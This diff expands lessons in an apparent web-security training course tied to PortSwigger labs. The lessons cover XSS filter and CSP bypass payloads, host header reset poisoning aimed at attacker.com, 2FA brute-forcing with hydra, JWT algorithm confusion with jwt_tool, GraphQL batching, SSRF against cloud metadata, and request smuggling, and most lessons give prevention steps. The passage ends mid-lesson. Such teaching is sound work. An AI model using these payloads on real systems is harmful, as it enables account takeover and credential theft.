@@ -659,57 +659,157 @@ You can trace data flow from DOM sources to sinks, identify exploitable patterns
         type: 'practice',
         duration: '4 hours',
         content: `:::objectives
-- Bypass common tag and attribute filters
-- Craft payloads for event handler injection
-- Understand CSP bypass techniques
+- Understand how XSS filters work and how to bypass them
+- Bypass common tag and attribute blocklists using alternative vectors
+- Understand Content Security Policy (CSP) as a defense mechanism and its weaknesses
 :::
 
-### Bypassing Tag Blocklists
+## How XSS Filters Work
 
-If <script> is blocked:
+Web applications try to prevent XSS by filtering user input. Common filtering approaches:
+
+| Filter Type | What It Does | Bypass Strategy |
+|-------------|-------------|-----------------|
+| Tag blocklist | Blocks specific HTML tags (\`<script>\`, \`<img>\`) | Use tags not on the list |
+| Attribute blocklist | Blocks event handlers (\`onerror\`, \`onload\`) | Use less common handlers |
+| Keyword blocklist | Blocks strings like "alert", "javascript" | Use encoding or alternative functions |
+| HTML entity encoding | Converts \`<\` to \`&lt;\` | Ensure the encoding happens AFTER the filter |
+
+The fundamental problem with blocklists: there are hundreds of HTML tags and event handlers. You can't block them all. If the filter misses even ONE, you have XSS.
+
+## Bypassing Tag Blocklists
+
+If \`<script>\` is blocked, use tags that execute JavaScript automatically:
+
 \`\`\`html
+<!-- img with failed source triggers onerror -->
 <img src=x onerror=alert(1)>
+
+<!-- SVG has its own event system -->
 <svg onload=alert(1)>
+
+<!-- body fires onload when page loads -->
 <body onload=alert(1)>
+
+<!-- audio/video have error events -->
 <audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
 \`\`\`
 
-If common tags are blocked:
+**Why these work:** The filter blocks \`<script>\` but doesn't know that \`<img>\`, \`<svg>\`, \`<body>\`, \`<audio>\`, and \`<video>\` can all execute JavaScript through event handlers.
+
+## Bypassing Attribute Blocklists
+
+If \`onerror\` and \`onload\` are blocked, use less common event handlers:
+
 \`\`\`html
+<!-- ontoggle fires when details element opens/closes -->
 <details open ontoggle=alert(1)>
+
+<!-- onstart fires when marquee animation starts -->
 <marquee onstart=alert(1)>
-<object onerror=alert(1)>
+
+<!-- onfocus fires when element receives focus -->
+<input onfocus=alert(1) autofocus>
+
+<!-- onanimationend fires when CSS animation ends -->
+<div style="animation:x 1s" onanimationend=alert(1)>
 \`\`\`
 
-### Event Handler Payloads (Auto-execution)
+**The principle:** HTML has dozens of event handlers. Blocklists can't catch them all. The attacker just needs to find ONE that's not blocked.
+
+## Bypassing Keyword Blocklists
+
+If "alert" is blocked:
+
+\`\`\`javascript
+// Use alternative functions
+confirm(1)
+prompt(1)
+print(1)
+
+// Use eval with encoded string
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+// Use constructor chaining
+[].constructor.constructor('alert(1)')()
+\`\`\`
+
+If "javascript:" is blocked in href:
 
 \`\`\`html
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<details open ontoggle=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
 \`\`\`
 
-### Content Security Policy (CSP)
+## Content Security Policy (CSP) — The Real Defense
 
-**CSP directives:**
-- script-src - controls allowed script sources
-- frame-ancestors - controls who can embed the page
+CSP is an HTTP response header that tells the browser which resources are allowed to load. Unlike input filtering, CSP is enforced by the browser, not the application.
 
-**CSP bypasses:**
-- 'unsafe-inline' - allows inline scripts
-- 'unsafe-eval' - allows eval()
-- Overly broad source lists (e.g., *.example.com)
+**How CSP works:**
 
-### Lab: Reflected XSS with Restricted Tags
+The server sends a header like:
+\`\`\`
+Content-Security-Policy: script-src 'self' https://cdn.example.com
+\`\`\`
 
-**URL:** https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-with-most-tags-and-attributes-blocked
+The browser then:
+1. Blocks all inline \`<script>\` tags
+2. Blocks all \`eval()\` calls
+3. Only allows scripts from the same origin ('self') or cdn.example.com
+4. Reports violations to a configured endpoint
+
+**Key CSP directives:**
+
+| Directive | Controls | What It Blocks |
+|-----------|----------|----------------|
+| \`script-src\` | JavaScript sources | Inline scripts, eval(), external scripts |
+| \`style-src\` | CSS sources | Inline styles, external stylesheets |
+| \`img-src\` | Image sources | Images from unauthorized domains |
+| \`connect-src\` | AJAX/fetch/WebSocket | Data exfiltration via requests |
+| \`frame-ancestors\` | Embedding | Clickjacking via iframes |
+| \`default-src\` | Fallback for all | Everything not explicitly allowed |
+
+**Why CSP defeats most XSS:**
+
+If CSP is \`script-src 'self'\`, even if an attacker injects \`<script>alert(1)</script>\`, the browser blocks it because inline scripts are not allowed. The attacker needs to find a script file on YOUR domain that does something dangerous — which is much harder.
+
+## CSP Bypass Techniques
+
+CSP is strong but not perfect. Common weaknesses:
+
+**1. 'unsafe-inline' — Defeats CSP entirely**
+\`\`\`
+Content-Security-Policy: script-src 'unsafe-inline'
+\`\`\`
+This allows inline scripts. If present, CSP provides zero XSS protection.
+
+**2. 'unsafe-eval' — Allows eval()**
+\`\`\`
+Content-Security-Policy: script-src 'unsafe-eval'
+\`\`\`
+If the application has any JSONP endpoint, the attacker can use eval() to execute arbitrary code.
+
+**3. Overly broad source lists**
+\`\`\`
+Content-Security-Policy: script-src *.example.com
+\`\`\`
+If ANY subdomain has an XSS vulnerability or hosts user-uploaded files, the attacker can use it to bypass CSP.
+
+**4. JSONP endpoints**
+If the CSP allows scripts from a domain that has a JSONP endpoint:
+\`\`\`javascript
+// The attacker loads this as a script:
+callback_function({"user": "admin", "token": "secret"})
+\`\`\`
+The JSONP response executes as JavaScript, bypassing CSP.
+
+**5. Base URI manipulation**
+If \`base-uri\` is not set, the attacker can inject a \`<base>\` tag to change the URL for all relative script loads.
 
 :::checkpoint
-You can bypass common XSS filters and understand CSP bypass techniques.
-:::
-`,
+You understand how XSS filters work, how to bypass them using alternative tags/attributes/encodings, and how CSP provides a stronger defense. You can identify CSP weaknesses and bypass techniques.
+:::`,
         aiPrompt: '',
         labUrl: 'https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-with-most-tags-and-attributes-blocked',
         labTitle: 'Reflected XSS: Most Tags and Attributes Blocked',
@@ -800,47 +900,143 @@ You understand how sessions work, how they can be compromised, and the mechanism
         type: 'practice',
         duration: '4 hours',
         content: `:::objectives
-- Understand password reset flow vulnerabilities
-- Exploit host header injection in password reset
-- Perform 2FA bypass techniques
+- Understand how password reset flows can be exploited through host header injection
+- Exploit host header injection to steal password reset tokens
+- Understand 2FA bypass techniques and their underlying mechanisms
 :::
 
-### Host Header Injection
+## Password Reset Flow Vulnerabilities
 
-If the reset URL is built from the Host header:
+Password reset is one of the most attacked features in web applications. The typical flow:
 
+1. User requests password reset
+2. Server generates a token and sends a reset link
+3. User clicks the link and sets a new password
+
+The vulnerability: **how is the reset URL constructed?**
+
+If the server uses the \`Host\` header to build the URL:
 \`\`\`python
 reset_url = f"https://{request.headers['Host']}/reset?token={token}"
 \`\`\`
 
-**Attack:** Modify the Host header to your domain - victim receives a reset link pointing to your server.
+The attacker controls the Host header. By changing it to their own domain, the reset link points to their server. When the victim clicks the link, the token appears in the attacker's server logs.
 
-### Lab: Password Reset Poisoning
+## Host Header Injection Attack
+
+**Step-by-step:**
+
+1. Attacker requests a password reset for the victim
+2. Attacker intercepts the request and changes the Host header:
+   \`\`\`
+   POST /forgot-password HTTP/1.1
+   Host: attacker.com
+   ...
+   email=victim@example.com
+   \`\`\`
+3. Server generates the reset URL using the attacker's domain:
+   \`\`\`
+   https://attacker.com/reset?token=abc123
+   \`\`\`
+4. Victim receives an email with the attacker's URL
+5. Victim clicks the link — token is sent to attacker.com
+6. Attacker uses the token to reset the victim's password
+
+**Why this works:** The server trusts the Host header without validation. The Host header is controlled by the client, not the server.
+
+**Variants:**
+- \`X-Forwarded-Host\` header (used by reverse proxies)
+- \`X-Original-Host\` header (used by some load balancers)
+- Absolute URL in the request line: \`GET https://attacker.com/ HTTP/1.1\`
 
 **Lab:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning
 
-**Steps:**
-1. Intercept the password reset request in Burp
-2. Change the Host header to your exploit server's domain
-3. The victim receives a reset link pointing to your server
-4. When they click it, the token appears in your server logs
+## 2FA Bypass Techniques
 
-### 2FA Bypass Techniques
+Two-factor authentication adds a second layer, but it can be bypassed if implemented incorrectly.
 
-**Direct request bypass:** Skip the 2FA step by directly accessing protected pages
-**Brute force 2FA codes:** Try all 10000 combinations (0000-9999)
+### Technique 1: Direct Request Bypass
 
-### Prevention
+If the 2FA check happens on a separate page, the attacker skips it by directly accessing the protected endpoint:
 
-1. Never use the Host header to construct URLs - use a configured base URL
+\`\`\`
+# Normal flow:
+POST /login → 200 OK → GET /verify-2fa → POST /verify → GET /dashboard
+
+# Bypass:
+POST /login → 200 OK → GET /dashboard (skip 2FA entirely)
+\`\`\`
+
+**Why this works:** The application checks credentials on the login page but doesn't enforce 2FA verification on the dashboard endpoint. The session is already created after successful password authentication.
+
+**Fix:** Create the authenticated session ONLY after 2FA verification, not after password authentication.
+
+### Technique 2: Brute Force 2FA Codes
+
+If the 2FA code is 4-6 digits with no rate limiting:
+
+\`\`\`bash
+# 4-digit code = 10,000 possibilities
+# 6-digit code = 1,000,000 possibilities
+# At 100 requests/second, 4-digit takes ~2 minutes
+hydra -l admin -P /usr/share/wordlists/2fa-codes.txt target http-post-form "/verify-2fa:code=^PASS^:F=invalid"
+\`\`\`
+
+**Why this works:** The application doesn't rate-limit 2FA attempts or lock the account after N failures.
+
+**Fix:** Rate-limit 2FA attempts (3-5 per minute), lock account after 5 failures, use time-based codes (TOTP) that expire quickly.
+
+### Technique 3: Response Manipulation
+
+If the 2FA check returns a specific response on success:
+
+\`\`\`javascript
+// Original response on failure:
+{"success": false, "message": "Invalid code"}
+
+// Attacker modifies the response to:
+{"success": true, "message": "Valid code"}
+\`\`\`
+
+**Why this works:** The client-side JavaScript trusts the server response without validation. If the attacker can modify the response (proxy, tamper), they can bypass the check.
+
+**Fix:** Never trust client-side validation. The server must enforce 2FA before creating the session.
+
+### Technique 4: Backup Code Abuse
+
+If backup codes are generated with weak randomness or can be requested multiple times:
+
+\`\`\`
+# Request backup codes multiple times to find patterns
+# Or brute-force weak backup codes (8-digit numeric = 100M possibilities)
+\`\`\`
+
+**Fix:** Generate cryptographically random backup codes, limit regeneration, rate-limit attempts.
+
+### Technique 5: Session Token Reuse
+
+If the 2FA token is the same session token used before 2FA:
+
+1. Attacker logs in with stolen credentials
+2. Receives session token (pre-2FA)
+3. Attacker waits for victim to complete 2FA
+4. Attacker uses the same session token (now post-2FA)
+
+**Fix:** Issue a NEW session token after 2FA verification.
+
+## Prevention Summary
+
+1. Never use the Host header to construct URLs — use a configured base URL
 2. Validate the Host header against a whitelist
 3. Rate limit password reset requests
 4. Use time-limited, single-use tokens
+5. Create authenticated sessions ONLY after 2FA verification
+6. Rate-limit 2FA attempts and lock after failures
+7. Issue new session tokens after 2FA completion
 
 :::checkpoint
-You can exploit host header injection, bypass 2FA, and test password reset flows.
-:::
-`,
+You understand how password reset flows can be poisoned via host header injection, and the common 2FA bypass techniques. You can test authentication flows for these vulnerabilities.
+:::`,
         aiPrompt: '',
         labUrl: 'https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning',
         labTitle: 'Password Reset Poisoning',
@@ -953,37 +1149,110 @@ You can decode JWTs, identify weak implementations, and exploit unverified signa
         type: 'practice',
         duration: '4 hours',
         content: `:::objectives
+- Understand the cryptographic difference between RS256 and HS256
 - Exploit the RS256 to HS256 algorithm confusion attack
 - Complete the PortSwigger algorithm confusion lab
 :::
 
-### RS256 to HS256 Confusion Attack
+## JWT Algorithms: RS256 vs HS256
 
-When a server uses RS256 but an attacker switches to HS256:
-1. Server uses RS256 with private key to sign, public key to verify
-2. Attacker changes header to {"alg": "HS256"}
-3. Attacker signs with the server's PUBLIC key (often in JWKS endpoints)
-4. Server verifies HS256 with the same public key - match
+JWTs use algorithms to sign tokens. The signature ensures the token hasn't been tampered with. There are two types:
+
+**HS256 (HMAC-SHA256) — Symmetric:**
+- ONE key is used for both signing and verification
+- The server signs with the secret, the server verifies with the SAME secret
+- If you know the secret, you can forge tokens
+- Analogy: a house key — same key locks and unlocks
+
+**RS256 (RSA-SHA256) — Asymmetric:**
+- TWO keys are used: private key for signing, public key for verification
+- The server signs with the PRIVATE key, anyone can verify with the PUBLIC key
+- Knowing the public key does NOT let you forge tokens
+- Analogy: a mailbox — the post office has the key to put mail in (private), anyone can check if mail is there (public)
+
+**Why RS256 is more secure:** Even if the attacker obtains the public key (which is often publicly available at JWKS endpoints), they cannot sign tokens because they don't have the private key.
+
+## The Algorithm Confusion Attack
+
+The vulnerability: **the server accepts the algorithm from the client-provided JWT header.**
+
+Normal RS256 flow:
+\`\`\`
+Header: {"alg": "RS256", "typ": "JWT"}
+Payload: {"user": "admin", "role": "user"}
+Signature: RSA-SHA256(header.payload, PRIVATE_KEY)
+\`\`\`
+
+The server verifies with:
+\`\`\`
+RSA-SHA256_verify(header.payload, signature, PUBLIC_KEY)
+\`\`\`
+
+**Attack flow:**
+
+1. Attacker obtains the server's PUBLIC key (usually at /.well-known/jwks.json)
+2. Attacker changes the header:
+   \`\`\`
+   {"alg": "HS256", "typ": "JWT"}
+   \`\`\`
+3. Attacker signs the token with the PUBLIC key as an HMAC secret:
+   \`\`\`
+   HMAC-SHA256(header.payload, PUBLIC_KEY)
+   \`\`\`
+4. Server receives the token, sees HS256, and verifies with:
+   \`\`\`
+   HMAC-SHA256_verify(header.payload, signature, PUBLIC_KEY)
+   \`\`\`
+5. **The signature matches** — because the same key was used for both signing and verification
+
+**Why this works:** HS256 uses the SAME key for signing and verification. If the server uses its public key as the verification key for HS256, and the attacker signs with that same public key, the verification succeeds.
+
+## Step-by-Step Attack
+
+**Step 1: Obtain the JWT**
+Log in and capture the RS256 JWT from the Authorization header.
+
+**Step 2: Find the public key**
+\`\`\`bash
+curl https://target/.well-known/jwks.json
+# or
+curl https://target/jwks.json
+\`\`\`
+
+**Step 3: Convert the public key to PEM format**
+\`\`\`bash
+# If it's a JWK (JSON Web Key), convert to PEM
+openssl rsa -pubin -in public_key.pem -text -noout
+\`\`\`
+
+**Step 4: Forge the token with HS256**
+\`\`\`bash
+# Using jwt_tool
+jwt_tool <JWT> -X k -pk public_key.pem -S hs256
+
+# Or manually:
+# 1. Change header to {"alg": "HS256"}
+# 2. Modify payload (change role to "admin")
+# 3. Sign with HMAC-SHA256(header.payload, PUBLIC_KEY)
+\`\`\`
+
+**Step 5: Use the forged token**
+\`\`\`bash
+curl -H "Authorization: Bearer <forged_jwt>" https://target/admin
+\`\`\`
 
 **Lab:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-jwt-authentication-bypass-via-algorithm-confusion
 
-**Steps:**
-1. Log in and obtain RS256 JWT
-2. Find public key at /jwks.json or /.well-known/jwks.json
-3. Use jwt_tool: jwt_tool <JWT> -X k -pk public_key.pem -S hs256
-4. Modify payload to escalate privileges
-5. Use forged token for admin access
+## Prevention
 
-### Prevention
-
-1. Validate the algorithm against a strict allowlist server-side
-2. Never accept algorithm changes from client-provided headers
-3. Use separate keys for different algorithms
+1. **Validate the algorithm against a server-side allowlist** — never accept algorithm changes from the client
+2. **Use separate keys for different algorithms** — don't reuse the same key for RS256 and HS256
+3. **Reject HS256 if RS256 is expected** — if your system uses asymmetric signing, never accept symmetric
+4. **Use a JWT library that enforces algorithm validation** — don't implement JWT verification manually
 
 :::checkpoint
-You can exploit RS256 to HS256 algorithm confusion and understand why allowing algorithm selection is dangerous.
-:::
-`,
+You understand the cryptographic difference between RS256 and HS256, why algorithm confusion works, and how to exploit it. You can test JWT implementations for this vulnerability.
+:::`,
         aiPrompt: '',
         labUrl: 'https://portswigger.net/web-security/authentication/other-mechanisms/lab-jwt-authentication-bypass-via-algorithm-confusion',
         labTitle: 'JWT Authentication Bypass via Algorithm Confusion',
@@ -1089,20 +1358,106 @@ You can discover API documentation, identify IDOR vulnerabilities, and exploit m
         type: 'practice',
         duration: '4 hours',
         content: `:::objectives
-- Perform GraphQL introspection queries
-- Exploit query batching for rate limit bypass
-- Test for nested query DoS attacks
+- Understand GraphQL architecture and how it differs from REST
+- Perform GraphQL introspection queries to map the API
+- Exploit query batching for rate limit bypass and nested query DoS attacks
 :::
 
-### GraphQL Introspection
+## GraphQL Architecture — What You're Attacking
 
-**Query all types:**
+GraphQL is a query language for APIs. Unlike REST (where the server defines the response structure), GraphQL lets the client specify exactly what data it wants.
+
+**How GraphQL works:**
+
+1. **Schema** — The server defines a schema with types, queries, and mutations
+2. **Resolvers** — Each field in the schema has a resolver function that fetches the data
+3. **Query** — The client sends a query specifying exactly which fields it wants
+4. **Response** — The server returns only the requested fields
+
+**Example schema:**
+\`\`\`graphql
+type User {
+  id: ID!
+  name: String!
+  email: String!
+  role: String!
+  ssn: String  # Hidden field — should not be exposed
+}
+
+type Query {
+  user(id: ID!): User
+  users: [User]
+}
+
+type Mutation {
+  login(username: String!, password: String!): AuthToken
+}
+\`\`\`
+
+**Example query:**
+\`\`\`graphql
+{
+  user(id: "1") {
+    name
+    email
+  }
+}
+\`\`\`
+
+**Response:**
+\`\`\`json
+{
+  "data": {
+    "user": {
+      "name": "Alice",
+      "email": "alice@example.com"
+    }
+  }
+}
+\`\`\`
+
+**Why GraphQL is different from REST:**
+- REST: \`GET /api/users/1\` → server returns ALL fields
+- GraphQL: Client asks for ONLY the fields it wants
+- This means: if the client asks for \`ssn\`, it might get it even if the UI doesn't display it
+
+**The security implication:** GraphQL schemas often contain hidden fields (ssn, role, internal IDs, admin flags) that are accessible if you know to ask for them. Introspection reveals ALL of these.
+
+## Introspection — Mapping the Attack Surface
+
+Introspection is a built-in GraphQL feature that lets you query the schema itself. It's like having a map of the entire API.
+
+**Query all types and fields:**
+
 \`\`\`graphql
 {
   __schema {
     types {
       name
-      fields { name type { name } }
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+\`\`\`
+
+This returns EVERY type in the schema, including:
+- Hidden fields (ssn, role, internalId)
+- Admin-only mutations
+- Internal types not meant for public use
+
+**Query specific type:**
+
+\`\`\`graphql
+{
+  __type(name: "User") {
+    fields {
+      name
+      type { name }
     }
   }
 }
@@ -1111,25 +1466,51 @@ You can discover API documentation, identify IDOR vulnerabilities, and exploit m
 **Risks of introspection:**
 - Reveals entire API schema including hidden fields
 - Exposes internal types and relationships
+- Shows all available queries and mutations
+- Reveals input types and validation rules
 
-### GraphQL Attacks
+**Defense:** Disable introspection in production:
+\`\`\`javascript
+// Apollo Server example
+const server = new ApolloServer({
+  schema,
+  introspection: process.env.NODE_ENV !== 'production'
+});
+\`\`\`
 
-**Query batching (rate limit bypass):**
-\`\`\`graphql
+## Attack: Query Batching (Rate Limit Bypass)
+
+GraphQL allows sending multiple queries in a single request. This can bypass rate limiting that counts requests, not operations.
+
+\`\`\`json
 [
-  { query: "mutation { login(user: \\"admin\\", pass: \\"pass1\\") { token } }" },
-  { query: "mutation { login(user: \\"admin\\", pass: \\"pass2\\") { token } }" }
+  { "query": "mutation { login(user: \\"admin\\", pass: \\"pass1\\") { token } }" },
+  { "query": "mutation { login(user: \\"admin\\", pass: \\"pass2\\") { token } }" },
+  { "query": "mutation { login(user: \\"admin\\", pass: \\"pass3\\") { token } }" }
 ]
 \`\`\`
 
-**Nested query attacks (DoS):**
+**Why this works:** The rate limiter counts HTTP requests, not GraphQL operations. One HTTP request containing 100 login attempts counts as 1 request.
+
+**Defense:** Rate-limit by operation count, not request count. Count the number of operations in the batch.
+
+## Attack: Nested Query DoS
+
+GraphQL allows querying nested relationships. Deeply nested queries can cause exponential data retrieval and server crashes.
+
 \`\`\`graphql
 {
   user {
     posts {
       author {
         posts {
-          author { posts { title } }
+          author {
+            posts {
+              author {
+                posts { title }
+              }
+            }
+          }
         }
       }
     }
@@ -1137,14 +1518,41 @@ You can discover API documentation, identify IDOR vulnerabilities, and exploit m
 }
 \`\`\`
 
-### Lab: Exploiting Vulnerable API Endpoint
+**Why this works:** If a user has 10 posts, each post has an author, each author has 10 posts... the data grows exponentially with each nesting level. A depth of 10 levels with 10 items each = 10 billion queries.
+
+**Defense:**
+- Limit query depth (e.g., max 5 levels)
+- Limit query complexity (assign cost to each field)
+- Use query cost analysis before execution
+
+## Attack: Field Suggestion Abuse
+
+GraphQL's "did you mean?" feature can leak field names:
+
+\`\`\`graphql
+{
+  user { ssn }
+}
+\`\`\`
+
+If \`ssn\` doesn't exist but \`socialSecurityNumber\` does, GraphQL might respond:
+\`\`\`json
+{
+  "errors": [{
+    "message": "Cannot query field 'ssn' on type 'User'. Did you mean 'socialSecurityNumber'?"
+  }]
+}
+\`\`\`
+
+**Defense:** Disable field suggestions in production.
+
+## Lab
 
 **Lab:** https://portswigger.net/web-security/api-testing/lab-exploiting-vulnerable-api-endpoint
 
 :::checkpoint
-You can perform GraphQL introspection, identify attack surfaces, and exploit common GraphQL vulnerabilities.
-:::
-`,
+You understand GraphQL architecture, can perform introspection to map the API, and know how to exploit batching, nested queries, and field suggestions.
+:::`,
         aiPrompt: '',
         labUrl: 'https://portswigger.net/web-security/api-testing/lab-exploiting-vulnerable-api-endpoint',
         labTitle: 'GraphQL Security: Exploiting a Vulnerable API Endpoint',
@@ -1178,56 +1586,120 @@ You can perform GraphQL introspection, identify attack surfaces, and exploit com
         type: 'lab',
         duration: '4 hours',
         content: `:::objectives
-- Understand what SSRF is and how it works
-- Access internal services (127.0.0.1, cloud metadata)
-- Bypass SSRF blacklist filters
+- Understand what SSRF is and why it's dangerous
+- Access internal services and cloud metadata through SSRF
+- Bypass SSRF blacklist filters using encoding tricks
 :::
 
-### What is SSRF?
+## What Is SSRF?
 
-SSRF occurs when a server makes HTTP requests to URLs controlled by the attacker.
+Server-Side Request Forgery (SSRF) occurs when an application makes HTTP requests to URLs that the attacker controls. The attacker tricks the server into fetching data from internal or external resources.
+
+**How it works:**
+
+1. The application has a feature that fetches URLs (image preview, link unfurling, webhook, PDF generation)
+2. The attacker provides a URL pointing to an internal resource
+3. The server fetches the URL — but from the SERVER's perspective, not the attacker's
+4. The server returns the internal data to the attacker
+
+**Example vulnerable code:**
+\`\`\`python
+# Image preview feature
+url = request.GET['url']
+image = requests.get(url)  # Server fetches ANY URL
+return image.content
+\`\`\`
+
+**Attack:**
+\`\`\`
+GET /preview?url=http://169.254.169.254/latest/meta-data/
+\`\`\`
+
+The server fetches the cloud metadata and returns it to the attacker.
+
+## Why SSRF Is Dangerous
 
 **Impact:**
-- Access internal services (127.0.0.1, internal APIs)
-- Read cloud metadata (169.254.169.254 on AWS)
-- Scan internal networks
+| Target | What You Get | Risk |
+|--------|-------------|------|
+| 127.0.0.1 | Internal web services, admin panels | Critical |
+| 169.254.169.254 | Cloud metadata (AWS/GCP/Azure) | Critical |
+| Internal network | Services not exposed to internet | High |
+| File system | /etc/passwd, config files | High |
+| DNS | Data exfiltration via DNS queries | Medium |
 
-### Accessing Internal Services
+## Cloud Metadata — The Big Prize
 
-\`\`\`
-http://127.0.0.1
-http://localhost
-http://[::1]  (IPv6 localhost)
-\`\`\`
+Cloud providers (AWS, GCP, Azure) expose instance metadata at a special IP address. This metadata includes credentials, tokens, and configuration that can lead to full cloud account compromise.
 
-**Cloud metadata (AWS):**
+**AWS Instance Metadata Service (IMDS):**
 \`\`\`
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 \`\`\`
 
-### Lab: Basic SSRF Against the Local Server
+**What you can get:**
+- IAM role credentials (access key, secret key, token)
+- Instance metadata (instance ID, AMI, security groups)
+- User data (startup scripts, often contain secrets)
+- Network configuration (VPC, subnet, private IP)
+
+**Why this is critical:** IAM role credentials let the attacker access AWS services (S3, DynamoDB, EC2) with the same permissions as the instance. If the instance has admin access, the attacker gets admin access to the entire AWS account.
+
+**GCP metadata:**
+\`\`\`
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+\`\`\`
+
+**Azure metadata:**
+\`\`\`
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+\`\`\`
+
+## Accessing Internal Services
+
+The server can reach internal services that are not exposed to the internet:
+
+\`\`\`
+http://127.0.0.1          # Localhost services
+http://127.0.0.1:8080     # Internal admin panels
+http://10.0.0.50          # Internal servers
+http://192.168.1.1        # Network devices
+http://[::1]              # IPv6 localhost
+\`\`\`
+
+**Why this matters:** Internal services often have no authentication (they assume only trusted internal traffic). An SSRF vulnerability lets you bypass network segmentation and access these services directly.
+
+## SSRF Filter Bypass
+
+Applications often try to block SSRF by blacklisting internal IPs. Common bypasses:
+
+| Filter | Bypass | Why It Works |
+|--------|--------|-------------|
+| \`127.0.0.1\` blocked | \`127.1\`, \`0177.0.0.1\`, \`0x7f000001\` | Alternative IP representations |
+| \`localhost\` blocked | \`127.0.0.1\`, \`[::1]\`, \`0.0.0.0\` | Different hostname/IP formats |
+| \`http://\` blocked | \`gopher://\`, \`file://\`, \`dict://\` | Alternative URL schemes |
+| IP blacklist | \`http://attacker.com\` (DNS to 127.0.0.1) | DNS rebinding |
+| URL validation | \`http://safe.com@127.0.0.1\` | URL parsing confusion |
+
+**DNS rebinding:** The attacker controls a DNS server. During validation, the domain resolves to a safe IP. During the actual request, it resolves to 127.0.0.1.
 
 **Lab:** https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost-local-server
 
-### SSRF with Blacklist Bypass
+## Prevention
 
-| Filter | Bypass |
-|--------|--------|
-| 127.0.0.1 blocked | Use 127.1, 0177.0.0.1, 0x7f000001 |
-| localhost blocked | Use 127.0.0.1, [::1] |
-| http:// blocked | Use gopher://, file:// |
-
-### Prevention
-
-1. Allowlist approach: Only allow requests to known, trusted URLs
-2. Block internal IPs: Prevent requests to 127.0.0.1, 10.x, 192.168.x
-3. Use network segmentation
+1. **Allowlist approach:** Only allow requests to known, trusted URLs
+2. **Block internal IPs:** Prevent requests to 127.0.0.1, 10.x, 192.168.x, 169.254.x
+3. **Disable unnecessary URL schemes:** Only allow http:// and https://
+4. **Use network segmentation:** Limit what the server can reach
+5. **Use IMDSv2:** AWS's newer metadata service requires a PUT request with a token (harder to exploit via SSRF)
+6. **Validate DNS resolution:** Check the resolved IP, not just the hostname
 
 :::checkpoint
-You can exploit SSRF to access internal services and bypass blacklist filters.
-:::
-`,
+You understand SSRF mechanics, can access cloud metadata, and know how to bypass common filters. You can test applications for SSRF vulnerabilities.
+:::`,
         aiPrompt: '',
         labUrl: 'https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost-local-server',
         labTitle: 'Basic SSRF Against the Local Server',
@@ -1251,16 +1723,47 @@ You can exploit SSRF to access internal services and bypass blacklist filters.
         type: 'practice',
         duration: '4 hours',
         content: `:::objectives
-- Understand CL.TE and TE.CL request smuggling
-- Identify desync vulnerabilities between front-end and back-end servers
+- Understand how HTTP request boundaries are determined
+- Identify CL.TE and TE.CL desync vulnerabilities
 - Test for server-side parameter pollution
 :::
 
-### What is Request Smuggling?
+## How HTTP Request Boundaries Work
 
-HTTP request smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests.
+When you send an HTTP request, the server needs to know where one request ends and the next begins. There are two ways to specify this:
 
-### CL.TE (Content-Length vs Transfer-Encoding)
+**Content-Length (CL):** "The body is exactly N bytes long"
+\`\`\`http
+POST /login HTTP/1.1
+Content-Length: 13
+
+username=admin
+\`\`\`
+
+**Transfer-Encoding (TE):** "The body is chunked — read until you see a zero-length chunk"
+\`\`\`http
+POST /login HTTP/1.1
+Transfer-Encoding: chunked
+
+d
+username=admin
+0
+\`\`\`
+
+**The problem:** What if both headers are present? The HTTP spec says Transfer-Encoding takes priority. But some servers don't follow the spec.
+
+## What Is Request Smuggling?
+
+Request smuggling exploits discrepancies in how front-end (proxy/load balancer) and back-end servers parse HTTP requests when both Content-Length and Transfer-Encoding headers are present.
+
+**Architecture that's vulnerable:**
+\`\`\`
+Client → Front-end (proxy/CDN) → Back-end (web server)
+\`\`\`
+
+If the front-end uses Content-Length and the back-end uses Transfer-Encoding (or vice versa), they disagree about where one request ends and the next begins. This lets the attacker "smuggle" a second request inside the first.
+
+## CL.TE Attack (Content-Length vs Transfer-Encoding)
 
 **Front-end uses Content-Length, back-end uses Transfer-Encoding:**
 
@@ -1275,20 +1778,74 @@ Transfer-Encoding: chunked
 SMUGGLED
 \`\`\`
 
-### Lab: Server-Side Parameter Pollution
+**What each server sees:**
 
-**Lab:** https://portswigger.net/web-security/request-smuggling/lab-server-side-parameter-pollution-in-query-string
+**Front-end (uses CL):** Reads 13 bytes of body: \`0\\r\\n\\r\\nSMUGGLED\`. This is a complete request. The remaining data is treated as the next request.
 
-### Prevention
+**Back-end (uses TE):** Reads chunked body: \`0\` = zero-length chunk = end of request. Then \`SMUGGLED\` is treated as the start of a NEW request.
 
-1. Use HTTP/2 end-to-end
-2. Normalize all requests at the front-end
-3. Ensure front-end and back-end use the same parsing behavior
+**Result:** The back-end sees a smuggled request that the front-end didn't authorize.
+
+## TE.CL Attack (Transfer-Encoding vs Content-Length)
+
+**Front-end uses Transfer-Encoding, back-end uses Content-Length:**
+
+\`\`\`http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+\`\`\`
+
+**What each server sees:**
+
+**Front-end (uses TE):** Reads chunked body: chunk of 8 bytes (\`SMUGGLED\`), then zero-length chunk = end of request.
+
